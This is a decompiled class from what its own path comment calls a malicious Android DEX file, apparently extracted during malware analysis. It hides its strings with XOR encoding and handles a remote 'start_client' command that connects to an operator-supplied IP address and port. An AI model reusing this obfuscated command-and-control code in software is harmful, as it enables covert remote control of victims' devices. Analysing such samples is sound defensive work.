package com.zjxyxnvvp.nxvxchltf.i;

import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.niNOIAdiowanOI;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class m {
    private static short[] $ = {66, 101, 125, 106, 103, 98, 111, 43, 123, 100, 121, 127, 43, 881, 870, 880, 886, 879, 887, 8654, 8649, 8668, 8655, 8649, 8674, 8670, 8657, 8660, 8664, 8659, 8649, 6982, 7007, 7461, 7482, 7463, 7457, 5362, 5333, 5325, 5338, 5335, 5330, 5343, 5275, 5330, 5323, 5275, 9411, 9454, 9466, 9441, 9452, 9447, 9446, 9441, 9448, 9391, 9452, 9443, 9446, 9450, 9441, 9467, 9377, 9377, 9377, 9391, 9452, 9447, 9450, 9452, 9444, 9391, 9468, 9462, 9468, 9391, 9443, 9440, 9448, 9468};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(niNOIAdiowanOI ninoiadiowanoi) {
        String $2 = $(0, 13, 11);
        String $3 = $(13, 19, 771);
        d dVar = d.e;
        p pVar = dVar.c;
        String $4 = $(19, 31, 8637);
        f b2 = pVar.b($4);
        if (b2 != null) {
            String optString = b2.a().optString($(31, 33, 6959));
            String optString2 = b2.a().optString($(33, 37, 7509));
            JSONObject jSONObject = new JSONObject();
            try {
                short parseShort = Short.parseShort(optString2);
                if (optString.isEmpty()) {
                    jSONObject.put($3, $(37, 48, 5307) + optString);
                    dVar.c.e($4, jSONObject);
                } else if (parseShort == 0) {
                    jSONObject.put($3, $2 + ((int) parseShort));
                    dVar.c.e($4, jSONObject);
                } else {
                    jSONObject.put($3, $(48, 82, 9359));
                    dVar.c.e($4, jSONObject);
                    ninoiadiowanoi.o(optString, parseShort);
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }
}
